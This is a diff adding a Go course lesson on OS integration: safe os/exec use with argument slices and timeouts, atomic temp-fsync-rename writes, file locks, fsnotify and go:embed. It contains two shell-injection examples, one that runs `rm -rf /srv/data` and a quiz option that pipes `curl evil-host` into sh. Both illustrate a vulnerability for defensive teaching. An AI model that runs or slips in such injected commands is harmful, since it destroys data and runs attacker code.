@@ -1,0 +1,180 @@
+---
+concepts:
+- go-os-integration
+deepensInto: []
+estMin: 19
+lang: en
+lessonType: topic
+level: senior
+order: 3
+prereqs: []
+slug: "03-os-integration"
+sources:
+- https://pkg.go.dev/os/exec
+- https://pkg.go.dev/os
+- https://pkg.go.dev/embed
+- https://pkg.go.dev/path/filepath
+spiral: []
+status: ready
+summary: 'os/exec with arg slices and CommandContext kills shell injection and hung children; ExitError carries the code. Files: O_EXCL lock files, atomic replace via temp plus fsync plus rename on one filesystem, advisory flock, fsnotify storms on editor saves, go:embed for one binary.'
+title: 'OS integration: os/exec without injection, atomic rename, advisory locks, fsnotify, and go:embed'
+track: "go"
+unit: "13-systems-projects"
+---
+
+import Hook from "~/components/lesson/Hook.astro";
+import Explanation from "~/components/lesson/Explanation.astro";
+import Recap from "~/components/lesson/Recap.astro";
+import Inset from "~/components/lesson/Inset.astro";
+import Crux from "~/components/prose/Crux.astro";
+import KeyTakeaway from "~/components/prose/KeyTakeaway.astro";
+import RetrievalDrawer from "~/components/pedagogy/RetrievalDrawer.tsx";
+import Quiz from "~/components/pedagogy/Quiz.astro";
+import FlowDiagram from "~/components/diagram/FlowDiagram.astro";
+
+<Hook>
+The on-host agent rewrote its config file the same way every five minutes: `os.Create(path)`, encode, close. It worked for two years across a fleet of retail edge boxes — right up to a regional power blink one winter evening. `os.Create` opens with O_TRUNC: it zeroes the file *first* and writes the new bytes *second*, and between those two moments a few hundred machines lost power. They came back with a config file of exactly zero bytes. The agent read it at boot, failed to parse, exited; the supervisor restarted it; it read the same empty file again. A fleet of stores boot-looped until field techs ssh-ed into each box with a recovery image. The postmortem's most painful line was its shortest: had the writer used the temp-file, fsync, rename sequence, this failure would have been *physically impossible* — rename swaps a directory entry atomically, so every machine would have rebooted into either the old config or the new one, and nothing in between exists.
+</Hook>
+
+<Crux>Run processes with arg slices, never sh -c with input; replace files via temp, fsync, rename — the overwrite that survives a crash.</Crux>
+
+<Explanation>
+
+## Running processes: os/exec without footguns
+
+Shelling out is a systems tool's bread and butter — and three disciplines separate the correct version from the incident report:
+
+```go
+ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
+defer cancel()
+
+cmd := exec.CommandContext(ctx, "pg_dump", "--format=custom", dbName) // argv as a slice
+var stdout, stderr bytes.Buffer
+cmd.Stdout, cmd.Stderr = &stdout, &stderr     // capture separately — the lesson-01 contract
+
+err := cmd.Run()
+var exitErr *exec.ExitError
+switch {
+case err == nil:                              // exit 0
+case errors.As(err, &exitErr):
+	log.Printf("pg_dump exited %d: %s", exitErr.ExitCode(), stderr.String())
+default:                                      // could not even start: not found, permissions
+	log.Printf("exec failed: %v", err)
+}
+```
+
+**Discipline one: arguments are a slice, never a shell string.** `exec.Command("sh", "-c", "convert "+userFile)` hands your string to a shell parser, and a `userFile` of `x.png; rm -rf /srv/data` runs both commands. The argv slice goes to the kernel's exec directly — no shell, no word splitting, no injection class at all. If you catch yourself hand-quoting, you have already lost; restructure to a slice.
+
+**Discipline two: timeouts via CommandContext.** A child that hangs on a dead NFS mount hangs your goroutine forever without one. On cancellation the default is a hard `Kill`; since Go 1.20 the `Cancel` and `WaitDelay` fields let you send SIGTERM first and escalate — the lesson-02 contract, applied downward. One honest caveat: the kill hits *your child only*. If the child spawned grandchildren, they survive and keep the pipe open — `Wait` then blocks on the inherited descriptors. Putting the child in its own process group (`Setpgid`) and signaling the group is the real fix when you exec process trees.
+
+**Discipline three: environment and working directory are inputs.** `cmd.Env == nil` inherits your entire environment — every secret in it included. For anything security- or reproducibility-sensitive, set `cmd.Env` to an explicit minimal slice and pin `cmd.Dir`; a child that resolves relative paths against whatever directory your service happened to start in is a latent prod-versus-laptop bug.
+
+<Quiz
+  id="03-os-integration-quiz-1"
+  lessonSlug="03-os-integration"
+  lang="en"
+  question="A backup runner executes exec.Command with sh -c and a name string from an API request concatenated into the command. What is the vulnerability, and the fix?"
+  choices={[
+    { label: "Shell injection — a name like x; curl evil-host | sh executes arbitrary commands; pass argv as a slice directly to the target binary and validate the name", correct: true },
+    { label: "Only path traversal — the attacker can write outside the backup directory at worst", misconception: "Traversal is present too, but the shell upgrades it to arbitrary command execution: semicolons, pipes, and substitution all parse. The slice form removes the entire class, not just one symptom." },
+    { label: "Nothing — Go escapes arguments before invoking the shell", misconception: "Go performs no escaping whatsoever; the concatenated string reaches sh verbatim. The safety of os/exec comes from the argv slice path that never involves a shell, not from sanitization." },
+    { label: "The fix is wrapping the name in quotes inside the command string", misconception: "Hand-quoting is the classic broken fix — quote characters in the input break out again. The only robust move is removing the shell from the path entirely." },
+  ]}
+/>
+
+## Files at the OS level: the three primitives
+
+**Create-if-absent: O_EXCL.** `os.OpenFile(path, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o644)` succeeds for exactly one caller; everyone else gets `EEXIST`. That atomicity makes single-instance lock files and "claim this work item" markers. Its weakness is staleness: a crashed owner leaves the file behind, and the next start refuses to run against a lock nobody holds.
+
+**Atomic replace: temp, fsync, rename.** The only safe way to overwrite a file that something else might read — or that a power cut might interrupt:
+
+```go
+func atomicWrite(path string, data []byte) error {
+	tmp, err := os.CreateTemp(filepath.Dir(path), ".cfg-*")  // SAME directory = same filesystem
+	if err != nil { return err }
+	defer os.Remove(tmp.Name())                              // no-op after successful rename
+
+	if _, err := tmp.Write(data); err != nil { tmp.Close(); return err }
+	if err := tmp.Sync(); err != nil { tmp.Close(); return err }  // bytes durable BEFORE the swap
+	if err := tmp.Close(); err != nil { return err }
+	return os.Rename(tmp.Name(), path)                       // atomic directory-entry swap
+}
+```
+
+Each line carries a guarantee. The temp file lives in the *target's* directory because `rename(2)` is atomic only within one filesystem — across devices it fails with `EXDEV`, and the copy-then-delete fallback some libraries do silently is exactly the non-atomic write you were escaping (`/tmp` is routinely a separate tmpfs — the classic way this bug ships). `Sync` forces the data to disk *before* the swap; skip it and the kernel may persist the rename before the bytes, and a crash yields a correctly-named file full of garbage. For full paranoia, fsync the directory afterward too, so the new entry itself is durable. The price is real: an fsync costs single-digit milliseconds on SSDs and tens on spinning disks — which is why you batch state writes, not skip the sync.
+
+**Advisory locking: flock, honestly.** `syscall.Flock(fd, LOCK_EX)` coordinates *cooperating* processes — advisory means the kernel enforces nothing against a process that never asks; any program that just opens and writes sails straight through. Its superpower over an O_EXCL lock file: the lock dies with the process descriptor, so a crash cannot leave a stale lock. Its limits: same-machine only, and historically unreliable over NFS.
+
+<Quiz
+  id="03-os-integration-quiz-2"
+  lessonSlug="03-os-integration"
+  lang="en"
+  question="Why does write-temp + fsync + rename survive a power cut, when os.Create + Write on the target path does not?"
+  choices={[
+    { label: "os.Create truncates in place, so a zero-or-partial window exists; rename atomically swaps a fully written, fsynced file into the name — readers and crashes see old or new, never between", correct: true },
+    { label: "rename is faster, so the dangerous window is just much shorter", misconception: "The window is not shortened — it is eliminated. A directory-entry swap is atomic in the kernel: there is no instant at which the name points to partial content, regardless of timing." },
+    { label: "Calling fsync on the original file after writing would fix os.Create too", misconception: "fsync makes written bytes durable but does nothing about the truncate-first window — power loss after O_TRUNC and before the write still leaves zero bytes under the real name." },
+    { label: "The pattern only works on journaling filesystems", misconception: "rename atomicity within one filesystem is POSIX semantics, not a journaling feature. What the pattern does require is same-filesystem temp placement — across devices rename fails with EXDEV." },
+  ]}
+/>
+
+## Watching files: fsnotify and the editor storm
+
+fsnotify wraps inotify (Linux), kqueue (macOS/BSD), and ReadDirectoryChangesW (Windows) behind one channel of events — and the naive usage breaks on the very pattern you just learned. Editors and well-behaved config writers save *atomically*: write a temp file, rename it over the target. A watch placed on the file follows the **inode**, so the rename makes your watch fire REMOVE and then go silent forever — the name now points at an inode you are not watching. The robust recipe: watch the *directory*, filter events by name, and expect a burst — CREATE, WRITE, sometimes CHMOD and RENAME within a few milliseconds for one logical save. Debounce with a reset-on-event timer (100 ms is a sane default) and re-read the file once per burst. And never react to a WRITE by reading immediately: mid-write reads of a non-atomic writer hand you the same partial file the Hook's fleet booted from.
+
+## go:embed: the single binary, completed
+
+```go
+//go:embed templates/*.tmpl migrations/*.sql
+var assets embed.FS
+```
+
+Templates, static files, SQL migrations — compiled into the binary, read through `embed.FS` like any `fs.FS`. This completes the deployment story from lesson 01: the artifact is one file with no "forgot to copy the migrations directory" failure mode left. The honest costs: binary size grows by the assets, any asset change requires a rebuild, and the FS is read-only. One sharp edge: `embed.FS` paths always use forward slashes — which is exactly the `path` package's territory, not `filepath`.
+
+## Platform conditionals
+
+Two mechanisms with distinct jobs. **Build tags** (`//go:build linux`) split files when an API *does not exist* elsewhere — `flock` has no Windows equivalent (Windows offers LockFileEx with different semantics), so the lock implementation lives in `lock_unix.go` and `lock_windows.go`. **`runtime.GOOS` branches** handle small behavioral forks inside otherwise portable code — choosing a default config directory, say. And keep the two path packages straight: `path/filepath` speaks the host OS (separators, drive letters) and belongs to everything touching the real filesystem; `path` speaks eternal forward slashes and belongs to URLs and `embed.FS`. Mixing them is a Windows bug you will not see until a user files it.
+
+<Inset kind="why" lang="en">
+Why is rename the only atomic primitive, and not write? Because POSIX defines rename(2) to atomically replace its target within a filesystem — it is a pointer swap inside directory metadata, one entry updated in one operation. Writes have no such promise: a write is a byte-range operation with no transactional grouping, free to be torn at any block boundary by a crash. The filesystem hands you exactly one atomic operation over *names* — so the atomic-replace pattern exists to funnel every overwrite through that single guarantee: do all the fallible byte work on a name nobody reads, then spend the one atomic swap at the end.
+</Inset>
+
+</Explanation>
+
+<FlowDiagram
+  label="The atomic-replace pipeline: every fallible step happens on the temp name; the one atomic operation is spent last"
+  hue="var(--d-backend)"
+  perRow={3}
+  nodes={[
+    { id: "tmp", label: "create temp", sub: "same filesystem" },
+    { id: "write", label: "write bytes", sub: "full new content" },
+    { id: "fsync", label: "fsync(file)", sub: "data durable" },
+    { id: "rename", label: "rename(2)", sub: "atomic entry swap" },
+    { id: "dsync", label: "fsync(dir)", sub: "new name durable" },
+    { id: "readers", label: "readers", sub: "old or new, whole" },
+  ]}
+  edges={[
+    { from: "tmp", to: "write", label: "hidden name" },
+    { from: "write", to: "fsync", label: "before swap" },
+    { from: "fsync", to: "rename", label: "now safe" },
+    { from: "rename", to: "dsync", label: "metadata" },
+    { from: "dsync", to: "readers", label: "crash-proof" },
+  ]}
+  caption="A crash before rename leaves the old file untouched; after rename, the new one is complete. Cross-device rename fails with EXDEV — the temp must share the target's filesystem, which a /tmp tmpfs silently does not. fsync costs milliseconds; that is the price of the guarantee."
+/>
+
+<KeyTakeaway>Exec children with argv slices and CommandContext — no shell between you and the kernel, a deadline on every child, ExitError for the code, process groups when trees are involved. Overwrite files only by temp-write, fsync, rename on the same filesystem: rename is the one atomic operation over names. flock is advisory and dies with its process; watch directories, not files, and debounce the rename storm; go:embed finishes the single-binary artifact.</KeyTakeaway>
+
+<RetrievalDrawer
+  client:load
+  id="03-os-integration-retrieval"
+  lang="en"
+  questions={[
+    { q: "List the three os/exec disciplines and the grandchild caveat.", a: "One: arguments as an argv slice straight to the target binary — never sh -c with interpolated input, which is shell injection by construction; hand-quoting does not fix it, removing the shell does. Two: exec.CommandContext puts a deadline on every child; default cancellation is SIGKILL, and Go 1.20 Cancel plus WaitDelay enable a graceful TERM-then-KILL escalation. Distinguish errors with errors.As into exec.ExitError — a nonzero exit with stderr captured separately — versus could-not-start errors like a missing binary. Three: cmd.Env nil inherits your full environment, secrets included — set an explicit minimal slice and pin cmd.Dir for reproducibility. The caveat: the context kill signals only the direct child; grandchildren survive, keep inherited pipes open, and block Wait — for process trees, set Setpgid and signal the whole group." },
+    { q: "Give the full atomic-replace recipe and explain why each step exists, including the EXDEV trap.", a: "Create a temp file in the same directory as the target (same filesystem — rename across devices fails with EXDEV, and /tmp is routinely a separate tmpfs); write the complete new content; fsync the file so the bytes are durable before any swap — otherwise the kernel may persist the rename before the data and a crash yields a well-named garbage file; close; rename over the target — POSIX defines rename(2) as an atomic directory-entry replacement, so every reader and every crash sees the complete old file or the complete new one, never a mixture; optionally fsync the directory so the new entry itself survives power loss. The anti-pattern it replaces, truncate-then-write via os.Create, has a window where the real name holds zero or partial bytes — a power cut there is the fleet boot-loop story. fsync costs milliseconds; batch writes rather than skipping it." },
+  ]}
+/>
+
+<Recap lang="en">
+The operating system gives a Go service three kinds of leverage — child processes, files, and the binary itself — and each has one correct grip. Children run through os/exec with arguments as a slice, which removes shell injection as a class rather than sanitizing around it; CommandContext bounds every child with a deadline, Cancel and WaitDelay turn the default hard kill into a graceful TERM-then-KILL, ExitError carries the exit code while stderr is captured on its own stream, and trees of processes need a process group, because the context kill reaches only your direct child. The environment and working directory are inputs to control, not defaults to inherit. Files at the OS level rest on three primitives: O_EXCL gives atomic create-if-absent for locks and claims but leaves stale files after crashes; flock is advisory — binding only on processes that ask — yet self-cleaning, dying with its descriptor; and rename is the single atomic operation over names, which is why every safe overwrite is temp-write in the same directory, fsync, then rename — a sequence that turns a power cut from a zero-byte config and a boot-looping fleet into a non-event, at the millisecond price of the fsync, with EXDEV waiting for anyone whose temp file lives on a different filesystem. Watching files means watching directories, because atomic savers rename new inodes into place and a file watch dies with the old inode; debounce the event burst and read once. go:embed folds templates and migrations into the one-file artifact, and platform divergence splits across build tags for missing APIs and runtime.GOOS for small forks — with filepath for real disks and path for embedded ones.
+</Recap>
